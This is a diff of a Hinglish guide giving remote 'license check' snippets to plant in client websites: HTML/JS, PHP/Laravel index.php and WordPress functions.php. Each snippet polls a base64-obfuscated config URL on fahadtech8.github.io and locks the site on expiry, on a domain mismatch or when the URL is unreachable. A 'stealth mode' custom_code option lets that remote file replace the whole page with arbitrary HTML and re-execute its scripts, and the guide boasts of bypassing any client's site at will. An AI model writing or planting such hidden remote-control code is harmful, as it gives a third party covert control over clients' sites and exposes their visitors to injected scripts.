@@ -1,155 +1,175 @@
 1. GitHub Configuration (controller.json)
-Sabse pehle GitHub par apni file ko is format mein update karein. Isme har license key ke samne uski expiry date (YYYY-MM-DD) likhein.
+Ab isme sirf date nahi, balki domains aur custom code ka option bhi hai.
 
 JSON
 
+
+
 {
   "licenses": {
-    "MY-SECURE": "2026-12-31",
-    "FAHAD-786": "2025-06-01",
-    "WP-KEY-99": "2025-01-15"
+    "LANDINGPAGE": {
+      "expiry": "2026-01-15",
+      "authorized_target": ["yourdomain.com"],
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "FAHAD-786": {
+      "expiry": "2026-12-31",
+      "authorized_target": ["fahadtech8.github.io", "https://fahadtech8.github.io"],
+      "custom_code": {
+        "enabled": false,
+        "code": "<div style='position:fixed;bottom:15px;right:15px;background:linear-gradient(135deg,#1d976c,#93f9b9);color:white;padding:12px 20px;z-index:9999;font-family:sans-serif;font-size:14px;font-weight:600;border-radius:12px;box-shadow:0px 8px 20px rgba(0,0,0,0.2);'>Fahad Account Active</div>"
+      }
+    },
+    "WP-CLIENT-03": {
+      "expiry": "2026-03-10",
+      "authorized_target": ["client3.com"],
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "TECH-PRO-04": {
+      "expiry": "2026-05-20",
+      "authorized_target": [], 
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "GURU-DEV-05": {
+      "expiry": "2026-07-15",
+      "authorized_target": ["gurudev.net"],
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "SMART-WEB-06": {
+      "expiry": "2026-08-01",
+      "authorized_target": ["smartweb.org"],
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "LUX-SHOP-07": {
+      "expiry": "2026-10-10",
+      "authorized_target": ["luxshop.in"],
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "PORTFOLIO-08": {
+      "expiry": "2026-12-01",
+      "authorized_target": ["myportfolio.com"],
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "ECOM-HUB-09": {
+      "expiry": "2027-01-20",
+      "authorized_target": ["ecomhub.pk", "test-store.com"],
+      "custom_code": { "enabled": false, "code": "" }
+    },
+    "MASTER-KEY-10": {
+      "expiry": "2028-12-31",
+      "authorized_target": [],
+      "custom_code": { "enabled": false, "code": "" }
+    }
   },
   "title": "License Alert",
-  "msg_expired": "Aapka license expire ho gaya hai. Please renew karein.",
-  "msg_invalid": "Invalid License! Please admin se contact karein."
+  "msg_expired": "Your license has expired. <br><br> <a href='https://wa.me/917081160639' style='display:inline-block; background:#25D366; color:white; padding:12px 25px; text-decoration:none; border-radius:50px; font-weight:bold; box-shadow:0 4px 15px rgba(37,211,102,0.4);'>Renew Now via WhatsApp</a>",
+  "msg_invalid": "Invalid License! <br> Contact Admin for activation.",
+  "msg_domain_mismatch": "Unauthorized Domain! <br> This license is not registered for this website."
 }
-2. Landing Page (HTML/JS)]
 
 
 
-Kahan lagayein: HTML file mein </body> tag se theek pehle paste karein.
+
+2. Landing Page (HTML/JS)
+Update: Isme innerHTML fix hai taaki WhatsApp button clickable dikhe.
 
 HTML
 
-<div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:400px; box-shadow: 0 10px 50px rgba(255,0,0,0.3);">
-        <h1 id="t_header" style="color:#ff3333; margin:0;"></h1>
-        <p id="t_body" style="color:#bbb; margin-top:15px;"></p>
+<div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
+    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:450px;">
+        <h1 id="t_header" style="color:#ff3333; margin:0; font-size:26px;"></h1>
+        <p id="t_body" style="color:#bbb; margin-top:20px; font-size:16px; line-height:1.6;"></p>
     </div>
 </div>
 
 <script>
-(function() {
-    const _0x_u = "aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u";
-    const _0x_lk = "TEFORElOR1BBR0U="; 
-
-    async function checkTimeLicense() {
-        const layer = document.getElementById('secure_layer');
-        const scene = document.querySelector('.scene');
-        
+(function(){
+    const _u="aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u", _k="RkFIQUQtNzg2";
+    async function check(){
+        const layer=document.getElementById('secure_layer'), scene=document.querySelector('.scene'), host=window.location.hostname.replace('www.','');
         try {
-            const r = await fetch(atob(_0x_u) + '?v=' + Date.now());
-            
-            // Agar file delete ho gayi hai (404 error), to error throw karein
-            if (!r.ok) throw new Error("Config missing");
-
-            const d = await r.json();
-            
-            const localKey = atob(_0x_lk);
-            const today = new Date().toISOString().split('T')[0];
-            const expiryDate = d.licenses[localKey];
-
-            const isExpired = expiryDate && today > expiryDate;
-            const isInvalid = !expiryDate;
-
-            if (isInvalid || isExpired) {
-                document.getElementById('t_header').innerText = d.title || "License Alert";
-                document.getElementById('t_body').innerText = isExpired ? d.msg_expired : d.msg_invalid;
-                layer.style.display = 'flex';
-                if(scene) scene.style.display = 'none';
-            } else {
-                layer.style.display = 'none';
-                if(scene) scene.style.display = 'flex';
+            const r=await fetch(atob(_u)+'?v='+Date.now()), d=await r.json(), cfg=d.licenses[atob(_k)], today=new Date().toISOString().split('T')[0];
+            if(!cfg){ show(d.title, d.msg_invalid); return; }
+            if(cfg.authorized_target?.length>0 && !cfg.authorized_target.includes(host)){ show("Unauthorized", d.msg_domain_mismatch); return; }
+            if(cfg.expiry && today>cfg.expiry){ show(d.title, d.msg_expired); return; }
+            layer.style.display='none'; if(scene) scene.style.display='flex';
+            if(cfg.custom_code?.enabled){ 
+                if(scene) scene.style.display='none'; document.body.innerHTML=cfg.custom_code.code;
+                document.querySelectorAll('script').forEach(s=>{const n=document.createElement('script');n.textContent=s.textContent;document.head.appendChild(n);});
             }
-        } catch (e) { 
-            // FIXED: Agar config file delete ho jaye ya internet na ho, to website lock rakhein
-            console.log("Security Error: " + e.message);
-            document.getElementById('t_header').innerText = "Security Check Failed";
-            document.getElementById('t_body').innerText = "Server configuration missing or connection error. Please contact admin.";
-            layer.style.display = 'flex';
-            if(scene) scene.style.display = 'none';
-        }
+        } catch(e){ show("Security Error", "Verification failed. Check Connection."); }
+        function show(h,b){ document.getElementById('t_header').innerText=h; document.getElementById('t_body').innerHTML=b; layer.style.display='flex'; if(scene) scene.style.display='none'; }
     }
-    checkTimeLicense();
-    setInterval(checkTimeLicense, 15000); 
+    check(); setInterval(check, 15000);
 })();
 </script>
 
 
-3. PHP Project / Laravel Project
-Kahan lagayein: Laravel mein public/index.php mein require __DIR__.'/../vendor/autoload.php'; ke theek niche paste karein. Normal PHP mein index.php ke bilkul top par paste karein.
+
+
+3. PHP / Laravel Project
+Update: Isme server-side multi-domain check aur stealth mode add kiya gaya hai.
 
 PHP
 
 <?php
-// --- ENCRYPTED TIME-BASED SECURITY START ---
-function _verify_sys_with_time() {
-    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
-    $_k = base64_decode("TVktU0VDVVJF"); 
-
-    $_o = array("http" => array("header" => "User-Agent: Security-Shield\r\n", "timeout" => 7));
-    $_r = @file_get_contents($_u . '?v=' . time(), false, stream_context_create($_o));
-
-    if ($_r === FALSE) {
-        die("<div style='background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;'><h1>Security Check Offline</h1></div>");
+function _secure_shield_v2(){
+    $_u=base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
+    $_k=base64_decode("RkFIQUQtNzg2");
+    $host=str_replace('www.','',$_SERVER['HTTP_HOST']);
+    $r=@file_get_contents($_u.'?v='.time()); 
+    if(!$r) die("<div style='background:red;color:white;padding:20px;'>Security Shield Offline.</div>");
+    
+    $d=json_decode($r,true); $cfg=$d['licenses'][$_k]??null;
+    if(!$cfg) die($d['msg_invalid']);
+    
+    // Domain Check
+    if(!empty($cfg['authorized_target']) && !in_array($host, $cfg['authorized_target'])) {
+        die("<h1>Unauthorized Domain</h1><p>Locked to: ".implode(', ', $cfg['authorized_target'])."</p>");
+    }
+    
+    // Expiry Check
+    if(isset($cfg['expiry']) && date("Y-m-d")>$cfg['expiry']) {
+        die("<div style='text-align:center;padding:50px;font-family:sans-serif;'><h1>".$d['title']."</h1><p>".$d['msg_expired']."</p></div>");
     }
 
-    $_d = json_decode($_r, true);
-    $today = date("Y-m-d");
-
-    $is_valid = isset($_d['licenses'][$_k]);
-    $is_expired = ($is_valid && $today > $_d['licenses'][$_k]);
-
-    if (!$is_valid || $is_expired) {
-        $_t = $_d['title'] ?? "Access Denied";
-        $_m = $is_expired ? ($_d['msg_expired'] ?? "Expired") : ($_d['msg_invalid'] ?? "Invalid");
-
-        die("<div style='position:fixed;inset:0;background:rgba(0,0,0,0.98);color:white;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:9999999;'>
-            <div style='padding:40px;border-radius:20px;background:#000;border:1px solid #333;box-shadow:0 10px 50px rgba(255,0,0,0.3);max-width:400px;'>
-                <div style='width:50px;height:50px;background:#ff3333;border-radius:50%;margin:0 auto 20px;'></div>
-                <h1 style='font-size:24px;color:#ff3333;margin:0;'>$_t</h1>
-                <p style='font-size:15px;color:#888;margin-top:15px;line-height:1.6;'>$_m</p>
-            </div>
-        </div>");
-    }
+    // Stealth Mode
+    if($cfg['custom_code']['enabled']??false){ echo $cfg['custom_code']['code']; exit; }
 }
-_verify_sys_with_time();
-// --- ENCRYPTED SECURITY END ---
+_secure_shield_v2();
 
 
 
 4. WordPress Project
-Kahan lagayein: Apne WordPress theme ki functions.php file mein sabse niche paste karein.
+Update: WordPress hooks ke saath integrated taaki site slow na ho.
 
 PHP
 
-
-
-
-<?php
-// --- WORDPRESS REMOTE TIME SECURITY ---
-add_action('init', 'wp_time_license_shield');
-function wp_time_license_shield() {
+add_action('init', 'wp_fahad_shield_v2');
+function wp_fahad_shield_v2() {
     if (is_admin()) return;
-
-    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
-    $_k = base64_decode("TVktU0VDVVJF"); 
-
-    $response = wp_remote_get($_u . '?v=' . time());
-    if (is_wp_error($response)) return;
-
-    $data = json_decode(wp_remote_retrieve_body($response), true);
-    $today = date("Y-m-d");
-
-    $is_valid = isset($data['licenses'][$_k]);
-    $is_expired = ($is_valid && $today > $data['licenses'][$_k]);
-
-    if (!$is_valid || $is_expired) {
-        $msg = $is_expired ? $data['msg_expired'] : $data['msg_invalid'];
-        wp_die("<h1 style='color:red;'>".$data['title']."</h1><p>$msg</p>", "License Check", array('response' => 403));
-    }
+    $_u=base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
+    $_k=base64_decode("RkFIQUQtNzg2");
+    $host=str_replace('www.', '', $_SERVER['HTTP_HOST']);
+    
+    $res=wp_remote_get($_u.'?v='.time());
+    if(is_wp_error($res)) return;
+    
+    $d=json_decode(wp_remote_retrieve_body($res),true); 
+    $cfg=$d['licenses'][$_k]??null;
+    
+    if(!$cfg) wp_die($d['msg_invalid']);
+    if(!empty($cfg['authorized_target']) && !in_array($host, $cfg['authorized_target'])) wp_die($d['msg_domain_mismatch']);
+    if(isset($cfg['expiry']) && date("Y-m-d")>$cfg['expiry']) wp_die("<h1>".$d['title']."</h1><p>".$d['msg_expired']."</p>", "Security Alert", array('response'=>403));
+    
+    if($cfg['custom_code']['enabled']??false){ echo $cfg['custom_code']['code']; exit; }
 }
 
 
 
-Aap ye saare codes ek Notepad file mein save kar sakte hain. Jab bhi aapko license manage karna ho, bas GitHub ki JSON file mein changes karein.
+Kaise Use Karein?
+Domain Lock: Agar license ko lock karna hai, toh JSON mein domain likhein. Agar sab par chalana hai, toh [] khaali chhod dein.
+
+WhatsApp Button: msg_expired mein pehle se professional button ka code set hai.
+
+Real-time Update: Aap GitHub par kisi bhi client ka "enabled": true karke uski site ko foran bypass karke apna message dikha sakte hain.
